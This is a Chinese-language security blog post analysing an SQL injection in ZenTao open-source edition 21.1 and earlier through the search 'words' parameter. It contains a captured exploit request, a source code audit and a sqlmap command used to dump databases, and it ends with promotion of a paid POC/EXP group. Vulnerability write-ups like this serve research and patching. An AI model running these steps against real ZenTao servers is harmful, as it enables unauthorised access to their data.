#  禅道CMS开源版SQL注入漏洞分析   
1629192581190874  神农Sec   2025-01-12 01:00  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，学习文档，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。  
#   
  
原文链接：https://xz.aliyun.com/t/16976  
  
作者：1629192581190874  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x1 前言介绍**  
  
  
**禅道CMS开源版存在SQL注入漏洞**  
**官网：**  
https://www.zentao.net/  
**影响版本：**  
开源版21.1及以下版本  
**漏洞类型：**  
SQL注入  
**漏洞url：**  
http://192.168.88.9//index.php?m=search&f=index&words=2&type=all&zin=1  
  
  
**漏洞数据包（请手动抓包验证漏洞）：**  
```
GET /index.php?m=search&f=index&words=1

&type=all&zin=1 HTTP/1.1

Host: 192.168.88.6

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0

Accept: 

/

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate, br

Referer: 

http://192.168.88.6/

X-ZIN-Options: {"selector":["#configJS","title>

","body>*"],"type":"list"}

X-ZIN-App: search

X-Zin-Cache-Time: 0

X-Requested-With: XMLHttpRequest

Connection: keep-alive

Cookie: zentaosid=d5ikdmm295l1ca5ec4an8p4f7u; lang=zh-cn; vision=rnd; device=desktop; theme=default; keepLogin=on; za=admin; zp=abd630d8e942046184fb94d4e591e66cd011665a; hideMenu=false; tab=search

Priority: u=4
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x2 漏洞复现**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVjaf499F00TosawmKLsAoW1jrX57Gia1rwcFtKXnVGMBQzTwospIkQ8ploNAO7AGgDE0SZ7s6Fkug/640?wx_fmt=png&from=appmsg "")  
  
随便输入一点东西进行搜索  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVjaf499F00TosawmKLsAoWPH4D48oDwowFhdVlSrTic9tN5icM6ic9Kh6dT6xySeY40ntjaf16aSEug/640?wx_fmt=png&from=appmsg "")  
  
  
确定搜索参数为words  
  
输入单引号页面报错怀疑存在sql注入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVjaf499F00TosawmKLsAoWwW8qyzIGjm0roNRGIaXZyF22zzAhes92cqrMCWMxbPgBOVCm895iaKA/640?wx_fmt=png&from=appmsg "")  
  
  
对源码进行审计：  
  
根据路由来到module\search\ control.php  
  
在index这个方法中，words 参数被直接传递给 getList 方法，而 getList 方法在 model.php 中定义  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVjaf499F00TosawmKLsAoWwiaNXviclibian02BpkSesaCXRVSEqicy0yicDaVaKcia0ibxYCoWBH5qa0Icw/640?wx_fmt=png&from=appmsg "")  
  
  
接着来到 model.php，words 参数主要在 getList 方法中使用，在这个方法中，keywords 参数被传递给 getSqlParams 方法，并且 againstCond 和 likeCondition 被直接插入到 SQL 查询中。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVjaf499F00TosawmKLsAoWjM88RLXyEbcc7CO9pXSTFkVIB4EZv2SmBf6YiarccWJFk63MptC57rg/640?wx_fmt=png&from=appmsg "")  
  
  
再接着来到module\search\tao.php  
  
分析getSqlParams 方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVjaf499F00TosawmKLsAoWbNZvCYsvc7gEK9ic34ThznUoDribuupyvATqomesYvJ4ksx6IaVYcoNw/640?wx_fmt=png&from=appmsg "")  
  
  
这里存在 SQL 注入漏洞，因为 keywords 参数没有进行任何过滤或转义处理。  
  
在 againstCond 的拼接过程中，每个单词被直接添加到查询条件中，没有进行任何过滤或转义处理。如果 $word 是单引号（'），它会被包含在 + 运算符和双引号内，导致生成的 SQL 查询语句不正确。likeCondition 直接将 $keywords 插入到 SQL 查询中，没有进行任何过滤或转义处理。如果 $keywords 包含特殊字符（如单引号等），会导致生成的 SQL 查询语句不正确，从而产生 SQL 注入漏洞。  
  
$keywords 变量的处理会将这个单引号字符传递给 $against 和 $againstCond。  
  
最终生成的 SQL 查询语句中会出现不正确的字符，导致 SQL 注入漏洞。  
  
上述分析后接下来对搜索功能的数据包进行抓包并把参数加入*号 放入sqlmap进行测试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVjaf499F00TosawmKLsAoW7VeZMc5D22E3LCruzLMR0Z51ZG6GnPcRvZ6HkSyM653gPJ3pBzpgwQ/640?wx_fmt=png&from=appmsg "")  
  
  
命令如下：  
  
python sqlmap.py -r 1.txt --level=5 --risk=3 --threads=10 --dbms=mysql  
  
扫描出多个盲注  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVjaf499F00TosawmKLsAoW7YUfavYia9YboLvIRBfIpicxBuD0uEds8s8Z4DndsNZKrsYial0KmpNBQ/640?wx_fmt=png&from=appmsg "")  
  
  
执行—dbs尝试查询数据库验证漏洞  
  
验证成功，到此结束  
  
  
  
我们是神农安全，  
**点赞 + 在看**  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
圈子专注于更新  
**src/红蓝攻防**  
相关：  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
```  
  
  
  
  
  
```
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWBeNFS2WNPd2FJ1SmqGkcf3s0DkMZicbriaUEuXagWt2eqxBWkUXRyQabIczmNAT5nTxc9tvaBzlww/640?wx_fmt=png&from=appmsg "")  
  
  
**欢迎加入星球一起交流，券后价仅40元！！！ 即将满200人涨价**  
  
**长期更新，更多的0day/1day漏洞POC/EXP**  
  
    
  
  
  
